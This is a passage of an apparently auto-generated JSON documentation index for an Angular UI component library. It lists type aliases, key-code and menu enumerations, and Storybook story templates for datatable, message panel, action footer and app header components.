            "file": "libs/datatable/src/lib/sto-datatable/events.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 187
          },
          {
            "name": "SortFunction",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "function",
            "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 178
          },
          {
            "name": "ThemeClassName",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "\"sto-light-theme\" | \"sto-dark-theme\"",
            "file": "libs/common/src/lib/theme/models.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 186
          },
          {
            "name": "ThemeName",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "\"light\" | \"dark\"",
            "file": "libs/common/src/lib/theme/models.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 186
          },
          {
            "name": "TypographyClassName",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "\"sto-sm-typography\" | \"sto-m-typography\" | \"sto-l-typography\"",
            "file": "libs/common/src/lib/theme/models.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 186
          },
          {
            "name": "TypographyName",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "\"small\" | \"medium\" | \"large\"",
            "file": "libs/common/src/lib/theme/models.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 186
          }
        ],
        "enumerations": [
            {
                "name": "ColumnDisplay",
                "childs": [
                  {
                    "name": "Flex",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "flex"
                  },
                  {
                    "name": "Force",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "force"
                  }
                ],
              "ctype": "miscellaneous",
              "subtype": "enum",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "file": "libs/datatable/src/lib/sto-datatable/columns.ts"
            },
            {
                "name": "Key",
                "childs": [
                  {
                    "name": "Backspace",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "8"
                  },
                  {
                    "name": "Tab",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "9"
                  },
                  {
                    "name": "Enter",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "13"
                  },
                  {
                    "name": "Shift",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "16"
                  },
                  {
                    "name": "Ctrl",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "17"
                  },
                  {
                    "name": "Alt",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "18"
                  },
                  {
                    "name": "PauseBreak",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "19"
                  },
                  {
                    "name": "CapsLock",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "20"
                  },
                  {
                    "name": "Escape",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "27"
                  },
                  {
                    "name": "Space",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "32"
                  },
                  {
                    "name": "PageUp",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "33"
                  },
                  {
                    "name": "PageDown",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "34"
                  },
                  {
                    "name": "End",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "35"
                  },
                  {
                    "name": "Home",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "36"
                  },
                  {
                    "name": "LeftArrow",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "37"
                  },
                  {
                    "name": "UpArrow",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "38"
                  },
                  {
                    "name": "RightArrow",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "39"
                  },
                  {
                    "name": "DownArrow",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "40"
                  },
                  {
                    "name": "Insert",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "45"
                  },
                  {
                    "name": "Delete",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "46"
                  },
                  {
                    "name": "Zero",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "48"
                  },
                  {
                    "name": "ClosedParen",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Zero"
                  },
                  {
                    "name": "One",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "49"
                  },
                  {
                    "name": "ExclamationMark",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "One"
                  },
                  {
                    "name": "Two",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "50"
                  },
                  {
                    "name": "AtSign",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Two"
                  },
                  {
                    "name": "Three",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "51"
                  },
                  {
                    "name": "PoundSign",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Three"
                  },
                  {
                    "name": "Hash",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "PoundSign"
                  },
                  {
                    "name": "Four",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "52"
                  },
                  {
                    "name": "DollarSign",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Four"
                  },
                  {
                    "name": "Five",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "53"
                  },
                  {
                    "name": "PercentSign",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Five"
                  },
                  {
                    "name": "Six",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "54"
                  },
                  {
                    "name": "Caret",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Six"
                  },
                  {
                    "name": "Hat",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Caret"
                  },
                  {
                    "name": "Seven",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "55"
                  },
                  {
                    "name": "Ampersand",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Seven"
                  },
                  {
                    "name": "Eight",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "56"
                  },
                  {
                    "name": "Star",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Eight"
                  },
                  {
                    "name": "Asterik",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Star"
                  },
                  {
                    "name": "Nine",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "57"
                  },
                  {
                    "name": "OpenParen",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Nine"
                  },
                  {
                    "name": "A",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "65"
                  },
                  {
                    "name": "B",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "66"
                  },
                  {
                    "name": "C",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "67"
                  },
                  {
                    "name": "D",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "68"
                  },
                  {
                    "name": "E",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "69"
                  },
                  {
                    "name": "F",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "70"
                  },
                  {
                    "name": "G",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "71"
                  },
                  {
                    "name": "H",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "72"
                  },
                  {
                    "name": "I",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "73"
                  },
                  {
                    "name": "J",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "74"
                  },
                  {
                    "name": "K",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "75"
                  },
                  {
                    "name": "L",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "76"
                  },
                  {
                    "name": "M",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "77"
                  },
                  {
                    "name": "N",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "78"
                  },
                  {
                    "name": "O",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "79"
                  },
                  {
                    "name": "P",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "80"
                  },
                  {
                    "name": "Q",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "81"
                  },
                  {
                    "name": "R",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "82"
                  },
                  {
                    "name": "S",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "83"
                  },
                  {
                    "name": "T",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "84"
                  },
                  {
                    "name": "U",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "85"
                  },
                  {
                    "name": "V",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "86"
                  },
                  {
                    "name": "W",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "87"
                  },
                  {
                    "name": "X",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "88"
                  },
                  {
                    "name": "Y",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "89"
                  },
                  {
                    "name": "Z",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "90"
                  },
                  {
                    "name": "LeftWindowKey",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "91"
                  },
                  {
                    "name": "RightWindowKey",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "92"
                  },
                  {
                    "name": "SelectKey",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "93"
                  },
                  {
                    "name": "Numpad0",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "96"
                  },
                  {
                    "name": "Numpad1",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "97"
                  },
                  {
                    "name": "Numpad2",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "98"
                  },
                  {
                    "name": "Numpad3",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "99"
                  },
                  {
                    "name": "Numpad4",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "100"
                  },
                  {
                    "name": "Numpad5",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "101"
                  },
                  {
                    "name": "Numpad6",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "102"
                  },
                  {
                    "name": "Numpad7",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "103"
                  },
                  {
                    "name": "Numpad8",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "104"
                  },
                  {
                    "name": "Numpad9",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "105"
                  },
                  {
                    "name": "Multiply",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "106"
                  },
                  {
                    "name": "Add",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "107"
                  },
                  {
                    "name": "Subtract",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "109"
                  },
                  {
                    "name": "DecimalPoint",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "110"
                  },
                  {
                    "name": "Divide",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "111"
                  },
                  {
                    "name": "F1",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "112"
                  },
                  {
                    "name": "F2",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "113"
                  },
                  {
                    "name": "F3",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "114"
                  },
                  {
                    "name": "F4",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "115"
                  },
                  {
                    "name": "F5",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "116"
                  },
                  {
                    "name": "F6",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "117"
                  },
                  {
                    "name": "F7",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "118"
                  },
                  {
                    "name": "F8",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "119"
                  },
                  {
                    "name": "F9",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "120"
                  },
                  {
                    "name": "F10",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "121"
                  },
                  {
                    "name": "F11",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "122"
                  },
                  {
                    "name": "F12",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "123"
                  },
                  {
                    "name": "NumLock",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "144"
                  },
                  {
                    "name": "ScrollLock",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "145"
                  },
                  {
                    "name": "SemiColon",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "186"
                  },
                  {
                    "name": "Equals",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "187"
                  },
                  {
                    "name": "Comma",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "188"
                  },
                  {
                    "name": "Dash",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "189"
                  },
                  {
                    "name": "Period",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "190"
                  },
                  {
                    "name": "UnderScore",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Dash"
                  },
                  {
                    "name": "PlusSign",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Equals"
                  },
                  {
                    "name": "ForwardSlash",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "191"
                  },
                  {
                    "name": "Tilde",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "192"
                  },
                  {
                    "name": "GraveAccent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "Tilde"
                  },
                  {
                    "name": "OpenBracket",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "219"
                  },
                  {
                    "name": "ClosedBracket",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "221"
                  },
                  {
                    "name": "Quote",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "222"
                  }
                ],
              "ctype": "miscellaneous",
              "subtype": "enum",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "<p>MIT License</p>\n<p>Copyright (c) 2017 Nathan Friend</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the &quot;Software&quot;), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE. *</p>\n",
              "file": "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts"
            },
            {
                "name": "MenuItemTypes",
                "childs": [
                  {
                    "name": "External",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "externalLink"
                  },
                  {
                    "name": "ExternalNew",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "externalLinkNewWindow"
                  },
                  {
                    "name": "Internal",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "internalLink"
                  },
                  {
                    "name": "Navigate",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "navigate"
                  }
                ],
              "ctype": "miscellaneous",
              "subtype": "enum",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts"
            },
            {
                "name": "SelectionModes",
                "childs": [
                  {
                    "name": "Click",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "click"
                  },
                  {
                    "name": "DoubleClick",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "value": "dblclick"
                  }
                ],
              "ctype": "miscellaneous",
              "subtype": "enum",
              "deprecated": false,
              "deprecationMessage": "",
              "description": "",
              "file": "libs/datatable/src/lib/sto-datatable/selection-modes.ts"
            }
        ],
        "groupedVariables": {
            "libs/common/src/lib/sto-message-panel/message-panel.stories.ts": [
              {
                "name": "Accent",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"accent\" [dismissable]=\"false\" icon=\"info\">Accent Text Content</sto-message-panel>'\r\n  };\r\n}"
              },
              {
                "name": "argTypes",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "object",
                "defaultValue": "{\r\n  color: { control: { disable: true } },\r\n  dismissable: { control: { disable: true } },\r\n  icon: { control: { disable: true } },\r\n  severity: { control: { disable: true } },\r\n}"
              },
              {
                "name": "Danger",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"danger\" [dismissable]=\"false\" icon=\"error\">Danger Text Content (a little to red atm.. :) )</sto-message-panel>'\r\n  };\r\n}"
              },
              {
                "name": "Dismissable",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    props: { dismiss: action('Dismissed') },\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" [dismissable]=\"true\">Dismissable Text Content</sto-message-panel>'\r\n  };\r\n}"
              },
              {
                "name": "Primary",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"primary\" [dismissable]=\"false\" icon=\"info\">Primary Text Content</sto-message-panel>'\r\n  };\r\n}"
              },
              {
                "name": "Success",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"success\" [dismissable]=\"false\" icon=\"info\">Warning Text Content</sto-message-panel>'\r\n  };\r\n}"
              },
              {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    component: StoMessagePanelComponent,\r\n    props: { ...args, dismissed: action('Dismissed') },\r\n    template: '<sto-message-panel [color]=\"color\" [dismissable]=\"dismissable\" [icon]=\"icon\" (dismissed)=\"dismissed()\">{{ contents }}</sto-message-panel>'\r\n  };\r\n}"
              },
              {
                "name": "UsageWithInput",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "Template.bind({})"
              },
              {
                "name": "Warn",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warn\" [dismissable]=\"false\" icon=\"warning\">Warn Text Content</sto-message-panel>'\r\n  };\r\n}"
              },
              {
                "name": "Warning",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warning\" [dismissable]=\"false\" icon=\"warning\">Warning Text Content</sto-message-panel>'\r\n  };\r\n}"
              }
            ],
            "libs/datatable/src/lib/datatable-custom.stories.ts": [
              {
                "name": "Actionbar",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
                "defaultValue": "args => ( {\r\n  props: args,\r\n  template: `<h3>With an actionbar on the top left and right side</h3>\r\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\r\n  <sto-datatable-actions>\r\n      <sto-datatable-actions-left>\r\n        <button mat-icon-button><mat-icon>content_copy</mat-icon></button>\r\n        <button mat-icon-button><mat-icon>delete</mat-icon></button>\r\n       </sto-datatable-actions-left>\r\n      <sto-datatable-actions-right>\r\n        <button mat-icon-button><mat-icon>settings</mat-icon></button>\r\n      </sto-datatable-actions-right>\r\n  </sto-datatable-actions>\r\n</sto-datatable>`,\r\n} )"
              },
              {
                "name": "AutoSize",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story",
                "defaultValue": "(args) => ( {\r\n  props: args,\r\n  template: `<h3>Autosize will ensure the table always uses all available height top-down</h3>\r\n<sto-datatable [virtualScroll]=\"true\" [autoSize]=\"true\" [autoSizeOffset]=\"autosizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\r\n</sto-datatable>`,\r\n} )"
              },
              {
                "name": "MultilineFooter",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
                "defaultValue": "args => ( {\r\n  props: args,\r\n  template: `<h3>The table takes in a list of footer rows</h3>\r\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>`,\r\n} )"
              },
              {
                "name": "Paging",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story",
                "defaultValue": "(args) => ( {\r\n  props: {\r\n    page: action('Page change'),\r\n    setPage: (pageEvent: { pageIndex: number; }, that: { visibleRows: { total: unknown; invoiceNo: number; voyageNo: number; vesselName: string; allocated: number; }[]; }) => {\r\n      const startAt = pageEvent.pageIndex * 30;\r\n      const endAt = ( pageEvent.pageIndex + 1 ) * 30 - 1;\r\n      that.visibleRows = [ ...rows ].slice(startAt, endAt);\r\n    },\r\n    ...args\r\n  },\r\n  template: `\r\n<h3>Paging is done by using <a href=\"https://material.angular.io/components/paginator/overview\" target=\"_blank\">mat-paginator</a></h3>\r\n<mat-card class=\"sto-card\" (resize)=\"resize()\">\r\n<sto-datatable [virtualScroll]=\"false\" [height]=\"height\" [rows]=\"visibleRows\" [columns]=\"columns\">\r\n    <mat-paginator (page)=\"setPage($event, this); page($event)\" [showFirstLastButtons]=\"true\" [length]=\"rows.length\" [hidePageSize]=\"true\" [pageSize]=\"30\" [pageIndex]=\"activePage\"></mat-paginator>\r\n</sto-datatable>\r\n</mat-card>`\r\n} )"
              },
              {
                "name": "ResponsiveMode",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story",
                "defaultValue": "(args) => ( {\r\n  props: args,\r\n  template: `\r\n<h3>Responsive mode will make the grid break into a list, allowing for a simpler view</h3>\r\n<div [style.width.px]=\"emulateSmallElement ? breakpoint - 1 : 1000\">\r\n<sto-datatable [virtualScroll]=\"true\"\r\n[responsiveBreakPoint]=\"breakpoint\"\r\n[responsive]=\"true\"\r\n[responsiveView]=\"responsive\"\r\n[height]=\"400\"\r\n[rows]=\"rows\"\r\n[columns]=\"columns\"></sto-datatable>\r\n<ng-template #responsive let-row=\"row\">{{ row | json }}</ng-template>\r\n</div>`\r\n} )"
              }
            ],
            "libs/common/src/lib/sto-action-footer/action-footer.stories.ts": [
              {
                "name": "ActionFooter",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "Template.bind({})"
              },
              {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoActionFooterComponent>",
                "defaultValue": "(args: StoActionFooterComponent) => {\r\n  return {\r\n    component: StoActionFooterComponent,\r\n    props: {\r\n      ...args,\r\n      save: action('Save'),\r\n      cancel: action('Cancel')\r\n    },\r\n    template: '<sto-action-footer [isLoading]=\"isLoading\" [position]=\"position\" [shouldAddClass]=\"shouldAddClass\"><button mat-flat-button (click)=\"save()\" color=\"primary\">Save</button><button (click)=\"cancel()\" mat-button>Cancel</button></sto-action-footer>'\r\n  };\r\n}"
              }
            ],
            "libs/core/src/lib/sto-directives/sto-grid.directive.ts": [
              {
                "name": "ALL_GRIDS",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "[]",
                "defaultValue": "[ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ]"
              },
              {
                "name": "getClass",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "(width: number, small = 400, large = 800) => {\r\n  let cols = 1;\r\n  if ( width > small ) {\r\n    cols += 1;\r\n  }\r\n  if ( width > large ) {\r\n    cols += 2;\r\n  }\r\n  return `sto-f-grid--${cols}`;\r\n}"
              }
            ],
            "libs/common/src/lib/sto-app-header/app-header.stories.ts": [
              {
                "name": "AppHeader",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "Template.bind({})"
              },
              {
                "name": "AsTestEnvironment",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoAppHeaderComponent>",
                "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: {\r\n      environmentName: 'Systemtest',\r\n      testEnvironment: true,\r\n      ...args\r\n    },\r\n    template: `<sto-app-header [breadCrumbs]=\"[ { label: 'Root' }, { label: 'SubModule' } ]\" [environmentName]=\"environmentName\" [testEnvironment]=\"true\"></sto-app-header>`\r\n  };\r\n}"
              },
              {
                "name": "Template",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<>",
                "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: args,\r\n    template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\r\n  };\r\n}"
              },
              {
                "name": "withForm",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoAppHeaderComponent>",
